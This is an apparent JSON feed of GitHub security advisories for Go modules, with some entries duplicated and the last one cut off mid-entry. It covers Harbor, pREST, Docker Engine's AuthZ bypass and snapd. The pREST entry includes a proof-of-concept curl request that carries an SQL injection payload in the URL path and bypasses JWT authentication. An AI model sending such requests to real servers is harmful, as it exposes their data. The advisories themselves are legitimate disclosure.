{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Go modules",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/go.json",
    "description": "Security Advisory for Go modules on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Harbor fails to validate the maintainer role permissions when creating/updating/deleting project configurations - API call:</p>\n<ul>\n<li>PUT /projects/{project_name_or_id}/metadatas/{meta_name}</li>\n<li>POST /projects/{project_name_or_id}/metadatas/{meta_name}</li>\n<li>DELETE /projects/{project_name_or_id}/metadatas/{meta_name}</li>\n</ul>\n<p>By sending a request to create/update/delete a metadata with an name that belongs to a project that the currently authenticated and granted to the maintainer role user doesn’t have access to, the attacker could modify configurations in the current project.</p>\n<p>BTW: the maintainer role in Harbor was intended for individuals who closely support the project admin in maintaining the project but lack configuration management permissions. However, the maintainer role can utilize the metadata API to circumvent this limitation. It's important to note that any potential attacker must be authenticated and granted a specific project maintainer role to modify configurations, limiting their scope to only that project.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Will be fixed in v2.9.5, v2.10.3 and v2.11.0</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There are no workarounds available.</p>\n<h3 id=\"credit\">Credit</h3>\n<p>Thanks to Ravid Mazon(<a href=\"mailto:rmazon@paloaltonetworks.com\">rmazon@paloaltonetworks.com</a>), Jay Chen (<a href=\"mailto:jaychen@paloaltonetworks.com\">jaychen@paloaltonetworks.com</a>) Palo Alto Networks for reporting this issue.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/goharbor/harbor/security/advisories/GHSA-hw28-333w-qxp3\">https://github.com/goharbor/harbor/security/advisories/GHSA-hw28-333w-qxp3</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hw28-333w-qxp3\">https://github.com/advisories/GHSA-hw28-333w-qxp3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hw28-333w-qxp3",
            "title": "[github.com/goharbor/harbor] Harbor fails to validate the user permissions when updating project configurations",
            "date_modified": "2024-07-31T16:53:15.000Z",
            "date_published": "2024-07-31T16:53:13.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hw28-333w-qxp3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Harbor fails to validate the maintainer role permissions when creating/updating/deleting project configurations - API call:</p>\n<ul>\n<li>PUT /projects/{project_name_or_id}/metadatas/{meta_name}</li>\n<li>POST /projects/{project_name_or_id}/metadatas/{meta_name}</li>\n<li>DELETE /projects/{project_name_or_id}/metadatas/{meta_name}</li>\n</ul>\n<p>By sending a request to create/update/delete a metadata with an name that belongs to a project that the currently authenticated and granted to the maintainer role user doesn’t have access to, the attacker could modify configurations in the current project.</p>\n<p>BTW: the maintainer role in Harbor was intended for individuals who closely support the project admin in maintaining the project but lack configuration management permissions. However, the maintainer role can utilize the metadata API to circumvent this limitation. It's important to note that any potential attacker must be authenticated and granted a specific project maintainer role to modify configurations, limiting their scope to only that project.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Will be fixed in v2.9.5, v2.10.3 and v2.11.0</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There are no workarounds available.</p>\n<h3 id=\"credit\">Credit</h3>\n<p>Thanks to Ravid Mazon(<a href=\"mailto:rmazon@paloaltonetworks.com\">rmazon@paloaltonetworks.com</a>), Jay Chen (<a href=\"mailto:jaychen@paloaltonetworks.com\">jaychen@paloaltonetworks.com</a>) Palo Alto Networks for reporting this issue.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/goharbor/harbor/security/advisories/GHSA-hw28-333w-qxp3\">https://github.com/goharbor/harbor/security/advisories/GHSA-hw28-333w-qxp3</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hw28-333w-qxp3\">https://github.com/advisories/GHSA-hw28-333w-qxp3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hw28-333w-qxp3",
            "title": "[github.com/goharbor/harbor] Harbor fails to validate the user permissions when updating project configurations",
            "date_modified": "2024-07-31T16:53:15.000Z",
            "date_published": "2024-07-31T16:53:13.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hw28-333w-qxp3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Probably jwt bypass + sql injection\nor what i'm doing wrong?</p>\n<h3 id=\"poc-how-to-reproduce\">PoC (how to reproduce)</h3>\n<ol>\n<li>Create following files:</li>\n</ol>\n<p>docker-compose.yml:</p>\n<pre><code>services:\n  postgres:\n    image: postgres\n    container_name: postgres_container_mre\n    environment:\n      POSTGRES_USER: test_user_pg\n      POSTGRES_PASSWORD: test_pass_pg\n      POSTGRES_DB: test_db\n  prest:\n    image: prest/prest\n    build: .\n    volumes:\n      - ./queries:/queries\n      - ./migrations:/migrations\n    ports:\n      - \"3000:3000\"\n</code></pre>\n<p>Dockerfile:</p>\n<pre><code>from prest/prest:latest\n\nCOPY ./prest.toml prest.toml\n</code></pre>\n<p>prest.toml:</p>\n<pre><code>debug=false\nmigrations = \"./migrations\"\n\n[http]\nport = 3000\n\n[jwt]\ndefault = true\nkey = \"secret\"\nalgo = \"HS256\"\n\n[auth]\nenabled = true\ntype = \"body\"\nencrypt = \"MD5\"\ntable = \"prest_users\"\nusername = \"username\"\npassword = \"password\"\n\n[pg]\nURL = \"postgresql://test_user_pg:test_pass_pg@postgres:5432/test_db/?sslmode=disable\"\n\n[ssl]\nmode = \"disable\"\nsslcert = \"./PATH\"\nsslkey = \"./PATH\"\nsslrootcert = \"./PATH\"\n\n[expose]\nenabled = true\ndatabases = true\nschemas = true\ntables = true\n\n[queries]\nlocation = \"/queries\"\n</code></pre>\n<ol start=\"2\">\n<li>run commands:</li>\n</ol>\n<pre><code>mkdir -p migrations queries\ndocker compose up --build -d\n</code></pre>\n<p>wait for pg and prest, then run following to add test data to the pg:</p>\n<pre><code>export PGPASSWORD=test_pass_pg\ndocker exec -it postgres_container_mre psql -U test_user_pg -d test_db -c \"CREATE TABLE IF NOT EXISTS public.some_table (id int primary key, secret_data text);\\\nINSERT INTO public.some_table (id, secret_data) VALUES (1, 'some secret text') ON CONFLICT DO NOTHING;\"\n</code></pre>\n<ol start=\"3\">\n<li>SQL injection even without jwt token:</li>\n</ol>\n<pre><code>curl --location '127.0.0.1:3000/test_db/public\".some_table)%20s;--/auth'\n</code></pre>\n<p>output:</p>\n<pre><code>[{\"id\": 1, \"secret_data\": \"some secret text\"}]\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/prest/prest/security/advisories/GHSA-wm25-j4gw-6vr3\">https://github.com/prest/prest/security/advisories/GHSA-wm25-j4gw-6vr3</a></li>\n<li><a href=\"https://github.com/prest/prest/commit/96ff96cfdc7ad6dd86e2289fcd5a37ee70c8926e\">https://github.com/prest/prest/commit/96ff96cfdc7ad6dd86e2289fcd5a37ee70c8926e</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wm25-j4gw-6vr3\">https://github.com/advisories/GHSA-wm25-j4gw-6vr3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wm25-j4gw-6vr3",
            "title": "[github.com/prest/prest] pREST vulnerable to jwt bypass + sql injection",
            "date_modified": "2024-07-30T15:04:28.000Z",
            "date_published": "2024-07-30T15:04:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wm25-j4gw-6vr3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A security vulnerability has been detected in certain versions of Docker Engine, which could allow an attacker to bypass <a href=\"https://docs.docker.com/engine/extend/plugins_authorization/\">authorization plugins (AuthZ)</a> under specific circumstances. The base likelihood of this being exploited is low. This advisory outlines the issue, identifies the affected versions, and provides remediation steps for impacted users.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Using a specially-crafted API request, an Engine API client could make the daemon forward the request or response to an <a href=\"https://docs.docker.com/engine/extend/plugins_authorization/\">authorization plugin</a> without the body. In certain circumstances, the authorization plugin may allow a request which it would have otherwise denied if the body had been forwarded to it.</p>\n<p>A security issue was discovered In 2018,  where an attacker could bypass AuthZ plugins using a specially crafted API request. This could lead to unauthorized actions, including privilege escalation. Although this issue was fixed in Docker Engine <a href=\"https://docs.docker.com/engine/release-notes/18.09/#security-fixes-1\">v18.09.1</a> in January 2019, the fix was not carried forward to later major versions, resulting in a regression. Anyone who depends on authorization plugins that introspect the request and/or response body to make access control decisions is potentially impacted.</p>\n<p>Docker EE v19.03.x and all versions of Mirantis Container Runtime <strong>are not vulnerable.</strong></p>\n<h3 id=\"vulnerability-details\">Vulnerability details</h3>\n<ul>\n<li><strong>AuthZ bypass and privilege escalation:</strong> An attacker could exploit a bypass using an API request with Content-Length set to 0, causing the Docker daemon to forward the request without the body to the AuthZ plugin, which might approve the request incorrectly.</li>\n<li><strong>Initial fix:</strong> The issue was fixed in Docker Engine <a href=\"https://docs.docker.com/engine/release-notes/18.09/#security-fixes-1\">v18.09.1</a> January 2019..</li>\n<li><strong>Regression:</strong> The fix was not included in Docker Engine v19.03 or newer versions. This was identified in April 2024 and patches were released for the affected versions on July 23, 2024. The issue was assigned <a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-41110\">CVE-2024-41110</a>.</li>\n</ul>\n<h3 id=\"patches\">Patches</h3>\n<ul>\n<li>docker-ce v27.1.1 containes patches to fix the vulnerability.</li>\n<li>Patches have also been merged into the master, 19.0, 20.0, 23.0, 24.0, 25.0, 26.0, and 26.1 release branches.</li>\n</ul>\n<h3 id=\"remediation-steps\">Remediation steps</h3>\n<ul>\n<li>If you are running an affected version, update to the most recent patched version.</li>\n<li>Mitigation if unable to update immediately:<ul>\n<li>Avoid using AuthZ plugins.</li>\n<li>Restrict access to the Docker API to trusted parties, following the principle of least privilege.</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/moby/moby/commit/fc274cd2ff4cf3b48c91697fb327dd1fb95588fb\">https://github.com/moby/moby/commit/fc274cd2ff4cf3b48c91697fb327dd1fb95588fb</a></li>\n<li><a href=\"https://github.com/moby/moby/commit/a79fabbfe84117696a19671f4aa88b82d0f64fc1\">https://github.com/moby/moby/commit/a79fabbfe84117696a19671f4aa88b82d0f64fc1</a></li>\n<li><a href=\"https://www.docker.com/blog/docker-security-advisory-docker-engine-authz-plugin/\">https://www.docker.com/blog/docker-security-advisory-docker-engine-authz-plugin/</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/moby/moby/security/advisories/GHSA-v23v-6jw2-98fq\">https://github.com/moby/moby/security/advisories/GHSA-v23v-6jw2-98fq</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-41110\">https://nvd.nist.gov/vuln/detail/CVE-2024-41110</a></li>\n<li><a href=\"https://github.com/moby/moby/commit/411e817ddf710ff8e08fa193da80cb78af708191\">https://github.com/moby/moby/commit/411e817ddf710ff8e08fa193da80cb78af708191</a></li>\n<li><a href=\"https://github.com/moby/moby/commit/42f40b1d6dd7562342f832b9cd2adf9e668eeb76\">https://github.com/moby/moby/commit/42f40b1d6dd7562342f832b9cd2adf9e668eeb76</a></li>\n<li><a href=\"https://github.com/moby/moby/commit/65cc597cea28cdc25bea3b8a86384b4251872919\">https://github.com/moby/moby/commit/65cc597cea28cdc25bea3b8a86384b4251872919</a></li>\n<li><a href=\"https://github.com/moby/moby/commit/852759a7df454cbf88db4e954c919becd48faa9b\">https://github.com/moby/moby/commit/852759a7df454cbf88db4e954c919becd48faa9b</a></li>\n<li><a href=\"https://github.com/moby/moby/commit/a31260625655cff9ae226b51757915e275e304b0\">https://github.com/moby/moby/commit/a31260625655cff9ae226b51757915e275e304b0</a></li>\n<li><a href=\"https://github.com/moby/moby/commit/a79fabbfe84117696a19671f4aa88b82d0f64fc1\">https://github.com/moby/moby/commit/a79fabbfe84117696a19671f4aa88b82d0f64fc1</a></li>\n<li><a href=\"https://github.com/moby/moby/commit/ae160b4edddb72ef4bd71f66b975a1a1cc434f00\">https://github.com/moby/moby/commit/ae160b4edddb72ef4bd71f66b975a1a1cc434f00</a></li>\n<li><a href=\"https://github.com/moby/moby/commit/ae2b3666c517c96cbc2adf1af5591a6b00d4ec0f\">https://github.com/moby/moby/commit/ae2b3666c517c96cbc2adf1af5591a6b00d4ec0f</a></li>\n<li><a href=\"https://github.com/moby/moby/commit/cc13f952511154a2866bddbb7dddebfe9e83b801\">https://github.com/moby/moby/commit/cc13f952511154a2866bddbb7dddebfe9e83b801</a></li>\n<li><a href=\"https://github.com/moby/moby/commit/fc274cd2ff4cf3b48c91697fb327dd1fb95588fb\">https://github.com/moby/moby/commit/fc274cd2ff4cf3b48c91697fb327dd1fb95588fb</a></li>\n<li><a href=\"https://www.docker.com/blog/docker-security-advisory-docker-engine-authz-plugin\">https://www.docker.com/blog/docker-security-advisory-docker-engine-authz-plugin</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v23v-6jw2-98fq\">https://github.com/advisories/GHSA-v23v-6jw2-98fq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v23v-6jw2-98fq",
            "title": "[github.com/docker/docker] Authz zero length regression",
            "date_modified": "2024-07-30T10:18:58.000Z",
            "date_published": "2024-07-30T10:18:57.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v23v-6jw2-98fq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A security vulnerability has been detected in certain versions of Docker Engine, which could allow an attacker to bypass <a href=\"https://docs.docker.com/engine/extend/plugins_authorization/\">authorization plugins (AuthZ)</a> under specific circumstances. The base likelihood of this being exploited is low. This advisory outlines the issue, identifies the affected versions, and provides remediation steps for impacted users.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Using a specially-crafted API request, an Engine API client could make the daemon forward the request or response to an <a href=\"https://docs.docker.com/engine/extend/plugins_authorization/\">authorization plugin</a> without the body. In certain circumstances, the authorization plugin may allow a request which it would have otherwise denied if the body had been forwarded to it.</p>\n<p>A security issue was discovered In 2018,  where an attacker could bypass AuthZ plugins using a specially crafted API request. This could lead to unauthorized actions, including privilege escalation. Although this issue was fixed in Docker Engine <a href=\"https://docs.docker.com/engine/release-notes/18.09/#security-fixes-1\">v18.09.1</a> in January 2019, the fix was not carried forward to later major versions, resulting in a regression. Anyone who depends on authorization plugins that introspect the request and/or response body to make access control decisions is potentially impacted.</p>\n<p>Docker EE v19.03.x and all versions of Mirantis Container Runtime <strong>are not vulnerable.</strong></p>\n<h3 id=\"vulnerability-details\">Vulnerability details</h3>\n<ul>\n<li><strong>AuthZ bypass and privilege escalation:</strong> An attacker could exploit a bypass using an API request with Content-Length set to 0, causing the Docker daemon to forward the request without the body to the AuthZ plugin, which might approve the request incorrectly.</li>\n<li><strong>Initial fix:</strong> The issue was fixed in Docker Engine <a href=\"https://docs.docker.com/engine/release-notes/18.09/#security-fixes-1\">v18.09.1</a> January 2019..</li>\n<li><strong>Regression:</strong> The fix was not included in Docker Engine v19.03 or newer versions. This was identified in April 2024 and patches were released for the affected versions on July 23, 2024. The issue was assigned <a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-41110\">CVE-2024-41110</a>.</li>\n</ul>\n<h3 id=\"patches\">Patches</h3>\n<ul>\n<li>docker-ce v27.1.1 containes patches to fix the vulnerability.</li>\n<li>Patches have also been merged into the master, 19.0, 20.0, 23.0, 24.0, 25.0, 26.0, and 26.1 release branches.</li>\n</ul>\n<h3 id=\"remediation-steps\">Remediation steps</h3>\n<ul>\n<li>If you are running an affected version, update to the most recent patched version.</li>\n<li>Mitigation if unable to update immediately:<ul>\n<li>Avoid using AuthZ plugins.</li>\n<li>Restrict access to the Docker API to trusted parties, following the principle of least privilege.</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/moby/moby/commit/fc274cd2ff4cf3b48c91697fb327dd1fb95588fb\">https://github.com/moby/moby/commit/fc274cd2ff4cf3b48c91697fb327dd1fb95588fb</a></li>\n<li><a href=\"https://github.com/moby/moby/commit/a79fabbfe84117696a19671f4aa88b82d0f64fc1\">https://github.com/moby/moby/commit/a79fabbfe84117696a19671f4aa88b82d0f64fc1</a></li>\n<li><a href=\"https://www.docker.com/blog/docker-security-advisory-docker-engine-authz-plugin/\">https://www.docker.com/blog/docker-security-advisory-docker-engine-authz-plugin/</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/moby/moby/security/advisories/GHSA-v23v-6jw2-98fq\">https://github.com/moby/moby/security/advisories/GHSA-v23v-6jw2-98fq</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-41110\">https://nvd.nist.gov/vuln/detail/CVE-2024-41110</a></li>\n<li><a href=\"https://github.com/moby/moby/commit/411e817ddf710ff8e08fa193da80cb78af708191\">https://github.com/moby/moby/commit/411e817ddf710ff8e08fa193da80cb78af708191</a></li>\n<li><a href=\"https://github.com/moby/moby/commit/42f40b1d6dd7562342f832b9cd2adf9e668eeb76\">https://github.com/moby/moby/commit/42f40b1d6dd7562342f832b9cd2adf9e668eeb76</a></li>\n<li><a href=\"https://github.com/moby/moby/commit/65cc597cea28cdc25bea3b8a86384b4251872919\">https://github.com/moby/moby/commit/65cc597cea28cdc25bea3b8a86384b4251872919</a></li>\n<li><a href=\"https://github.com/moby/moby/commit/852759a7df454cbf88db4e954c919becd48faa9b\">https://github.com/moby/moby/commit/852759a7df454cbf88db4e954c919becd48faa9b</a></li>\n<li><a href=\"https://github.com/moby/moby/commit/a31260625655cff9ae226b51757915e275e304b0\">https://github.com/moby/moby/commit/a31260625655cff9ae226b51757915e275e304b0</a></li>\n<li><a href=\"https://github.com/moby/moby/commit/a79fabbfe84117696a19671f4aa88b82d0f64fc1\">https://github.com/moby/moby/commit/a79fabbfe84117696a19671f4aa88b82d0f64fc1</a></li>\n<li><a href=\"https://github.com/moby/moby/commit/ae160b4edddb72ef4bd71f66b975a1a1cc434f00\">https://github.com/moby/moby/commit/ae160b4edddb72ef4bd71f66b975a1a1cc434f00</a></li>\n<li><a href=\"https://github.com/moby/moby/commit/ae2b3666c517c96cbc2adf1af5591a6b00d4ec0f\">https://github.com/moby/moby/commit/ae2b3666c517c96cbc2adf1af5591a6b00d4ec0f</a></li>\n<li><a href=\"https://github.com/moby/moby/commit/cc13f952511154a2866bddbb7dddebfe9e83b801\">https://github.com/moby/moby/commit/cc13f952511154a2866bddbb7dddebfe9e83b801</a></li>\n<li><a href=\"https://github.com/moby/moby/commit/fc274cd2ff4cf3b48c91697fb327dd1fb95588fb\">https://github.com/moby/moby/commit/fc274cd2ff4cf3b48c91697fb327dd1fb95588fb</a></li>\n<li><a href=\"https://www.docker.com/blog/docker-security-advisory-docker-engine-authz-plugin\">https://www.docker.com/blog/docker-security-advisory-docker-engine-authz-plugin</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v23v-6jw2-98fq\">https://github.com/advisories/GHSA-v23v-6jw2-98fq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v23v-6jw2-98fq",
            "title": "[github.com/docker/docker] Authz zero length regression",
            "date_modified": "2024-07-30T10:18:58.000Z",
            "date_published": "2024-07-30T10:18:57.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v23v-6jw2-98fq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A security vulnerability has been detected in certain versions of Docker Engine, which could allow an attacker to bypass <a href=\"https://docs.docker.com/engine/extend/plugins_authorization/\">authorization plugins (AuthZ)</a> under specific circumstances. The base likelihood of this being exploited is low. This advisory outlines the issue, identifies the affected versions, and provides remediation steps for impacted users.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Using a specially-crafted API request, an Engine API client could make the daemon forward the request or response to an <a href=\"https://docs.docker.com/engine/extend/plugins_authorization/\">authorization plugin</a> without the body. In certain circumstances, the authorization plugin may allow a request which it would have otherwise denied if the body had been forwarded to it.</p>\n<p>A security issue was discovered In 2018,  where an attacker could bypass AuthZ plugins using a specially crafted API request. This could lead to unauthorized actions, including privilege escalation. Although this issue was fixed in Docker Engine <a href=\"https://docs.docker.com/engine/release-notes/18.09/#security-fixes-1\">v18.09.1</a> in January 2019, the fix was not carried forward to later major versions, resulting in a regression. Anyone who depends on authorization plugins that introspect the request and/or response body to make access control decisions is potentially impacted.</p>\n<p>Docker EE v19.03.x and all versions of Mirantis Container Runtime <strong>are not vulnerable.</strong></p>\n<h3 id=\"vulnerability-details\">Vulnerability details</h3>\n<ul>\n<li><strong>AuthZ bypass and privilege escalation:</strong> An attacker could exploit a bypass using an API request with Content-Length set to 0, causing the Docker daemon to forward the request without the body to the AuthZ plugin, which might approve the request incorrectly.</li>\n<li><strong>Initial fix:</strong> The issue was fixed in Docker Engine <a href=\"https://docs.docker.com/engine/release-notes/18.09/#security-fixes-1\">v18.09.1</a> January 2019..</li>\n<li><strong>Regression:</strong> The fix was not included in Docker Engine v19.03 or newer versions. This was identified in April 2024 and patches were released for the affected versions on July 23, 2024. The issue was assigned <a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-41110\">CVE-2024-41110</a>.</li>\n</ul>\n<h3 id=\"patches\">Patches</h3>\n<ul>\n<li>docker-ce v27.1.1 containes patches to fix the vulnerability.</li>\n<li>Patches have also been merged into the master, 19.0, 20.0, 23.0, 24.0, 25.0, 26.0, and 26.1 release branches.</li>\n</ul>\n<h3 id=\"remediation-steps\">Remediation steps</h3>\n<ul>\n<li>If you are running an affected version, update to the most recent patched version.</li>\n<li>Mitigation if unable to update immediately:<ul>\n<li>Avoid using AuthZ plugins.</li>\n<li>Restrict access to the Docker API to trusted parties, following the principle of least privilege.</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/moby/moby/commit/fc274cd2ff4cf3b48c91697fb327dd1fb95588fb\">https://github.com/moby/moby/commit/fc274cd2ff4cf3b48c91697fb327dd1fb95588fb</a></li>\n<li><a href=\"https://github.com/moby/moby/commit/a79fabbfe84117696a19671f4aa88b82d0f64fc1\">https://github.com/moby/moby/commit/a79fabbfe84117696a19671f4aa88b82d0f64fc1</a></li>\n<li><a href=\"https://www.docker.com/blog/docker-security-advisory-docker-engine-authz-plugin/\">https://www.docker.com/blog/docker-security-advisory-docker-engine-authz-plugin/</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/moby/moby/security/advisories/GHSA-v23v-6jw2-98fq\">https://github.com/moby/moby/security/advisories/GHSA-v23v-6jw2-98fq</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-41110\">https://nvd.nist.gov/vuln/detail/CVE-2024-41110</a></li>\n<li><a href=\"https://github.com/moby/moby/commit/411e817ddf710ff8e08fa193da80cb78af708191\">https://github.com/moby/moby/commit/411e817ddf710ff8e08fa193da80cb78af708191</a></li>\n<li><a href=\"https://github.com/moby/moby/commit/42f40b1d6dd7562342f832b9cd2adf9e668eeb76\">https://github.com/moby/moby/commit/42f40b1d6dd7562342f832b9cd2adf9e668eeb76</a></li>\n<li><a href=\"https://github.com/moby/moby/commit/65cc597cea28cdc25bea3b8a86384b4251872919\">https://github.com/moby/moby/commit/65cc597cea28cdc25bea3b8a86384b4251872919</a></li>\n<li><a href=\"https://github.com/moby/moby/commit/852759a7df454cbf88db4e954c919becd48faa9b\">https://github.com/moby/moby/commit/852759a7df454cbf88db4e954c919becd48faa9b</a></li>\n<li><a href=\"https://github.com/moby/moby/commit/a31260625655cff9ae226b51757915e275e304b0\">https://github.com/moby/moby/commit/a31260625655cff9ae226b51757915e275e304b0</a></li>\n<li><a href=\"https://github.com/moby/moby/commit/a79fabbfe84117696a19671f4aa88b82d0f64fc1\">https://github.com/moby/moby/commit/a79fabbfe84117696a19671f4aa88b82d0f64fc1</a></li>\n<li><a href=\"https://github.com/moby/moby/commit/ae160b4edddb72ef4bd71f66b975a1a1cc434f00\">https://github.com/moby/moby/commit/ae160b4edddb72ef4bd71f66b975a1a1cc434f00</a></li>\n<li><a href=\"https://github.com/moby/moby/commit/ae2b3666c517c96cbc2adf1af5591a6b00d4ec0f\">https://github.com/moby/moby/commit/ae2b3666c517c96cbc2adf1af5591a6b00d4ec0f</a></li>\n<li><a href=\"https://github.com/moby/moby/commit/cc13f952511154a2866bddbb7dddebfe9e83b801\">https://github.com/moby/moby/commit/cc13f952511154a2866bddbb7dddebfe9e83b801</a></li>\n<li><a href=\"https://github.com/moby/moby/commit/fc274cd2ff4cf3b48c91697fb327dd1fb95588fb\">https://github.com/moby/moby/commit/fc274cd2ff4cf3b48c91697fb327dd1fb95588fb</a></li>\n<li><a href=\"https://www.docker.com/blog/docker-security-advisory-docker-engine-authz-plugin\">https://www.docker.com/blog/docker-security-advisory-docker-engine-authz-plugin</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v23v-6jw2-98fq\">https://github.com/advisories/GHSA-v23v-6jw2-98fq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v23v-6jw2-98fq",
            "title": "[github.com/docker/docker] Authz zero length regression",
            "date_modified": "2024-07-30T10:18:58.000Z",
            "date_published": "2024-07-30T10:18:57.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v23v-6jw2-98fq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>In snapd versions prior to 2.62, when using AppArmor for enforcement of sandbox permissions, snapd failed to restrict writes to the $HOME/bin path. In Ubuntu, when this path exists, it is automatically added to the users PATH. An attacker who could convince a user to install a malicious snap which used the 'home' plug could use this vulnerability to install arbitrary scripts into the users PATH which may then be run by the user outside of the expected snap sandbox and hence allow them to escape confinement.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-1724\">https://nvd.nist.gov/vuln/detail/CVE-2024-1724</a></li>\n<li><a href=\"https://github.com/snapcore/snapd/pull/13689\">https://github.com/snapcore/snapd/pull/13689</a></li>\n<li><a href=\"https://github.com/snapcore/snapd/commit/aa191f97713de8dc3ce3ac818539f0b976eb8ef6\">https://github.com/snapcore/snapd/commit/aa191f97713de8dc3ce3ac818539f0b976eb8ef6</a></li>\n<li><a href=\"https://gld.mcphail.uk/posts/explaining-cve-2024-1724\">https://gld.mcphail.uk/posts/explaining-cve-2024-1724</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4mh8-9689-38vr\">https://github.com/advisories/GHSA-4mh8-9689-38vr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4mh8-9689-38vr",
            "title": "[github.com/snapcore/snapd] snapd failed to restrict writes to the $HOME/bin path",
            "date_modified": "2024-07-26T21:34:23.000Z",
            "date_published": "2024-07-25T21:31:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4mh8-9689-38vr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>In snapd versions prior to 2.62, snapd failed to properly check the file type when extracting a snap. The snap format is a squashfs file-system image and so can contain files that are non-regular files (such as pipes or sockets etc). Various file entries within the snap squashfs image (such as icons etc) are directly read by snapd when it is extracted. An attacker who could convince a user to install a malicious snap which contained non-regular files at these paths could then cause snapd to block indefinitely trying to read from such files and cause a denial of service.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-29068\">https://nvd.nist.gov/vuln/detail/CVE-2024-29068</a></li>\n<li><a href=\"https://github.com/snapcore/snapd/pull/13682\">https://github.com/snapcore/snapd/pull/13682</a></li>\n<li><a href=\"https://github.com/snapcore/snapd/commit/b66fee81606a1c05f965a876ccbaf44174194063\">https://github.com/snapcore/snapd/commit/b66fee81606a1c05f965a876ccbaf44174194063</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-64jh-cjwc-w8q6\">https://github.com/advisories/GHSA-64jh-cjwc-w8q6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-64jh-cjwc-w8q6",
            "title": "[github.com/snapcore/snapd] snapd failed to properly check the file type when extracting a snap",
            "date_modified": "2024-07-26T21:32:59.000Z",
            "date_published": "2024-07-25T21:31:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-64jh-cjwc-w8q6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>In snapd versions prior to 2.62, snapd failed to properly check the destination of symbolic links when extracting a snap. The snap format is a squashfs file-system image and so can contain symbolic links and other file types. Various file entries within the snap squashfs image (such as icons and desktop files etc) are directly read by snapd when it is extracted. An attacker who could convince a user to install a malicious snap which contained symbolic links at these paths could then cause snapd to write out the contents of the symbolic link destination into a world-readable directory. This in-turn could allow an unprivileged user to gain access to privileged information.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-29069\">https://nvd.nist.gov/vuln/detail/CVE-2024-29069</a></li>\n<li><a href=\"https://github.com/snapcore/snapd/pull/13682\">https://github.com/snapcore/snapd/pull/13682</a></li>\n<li><a 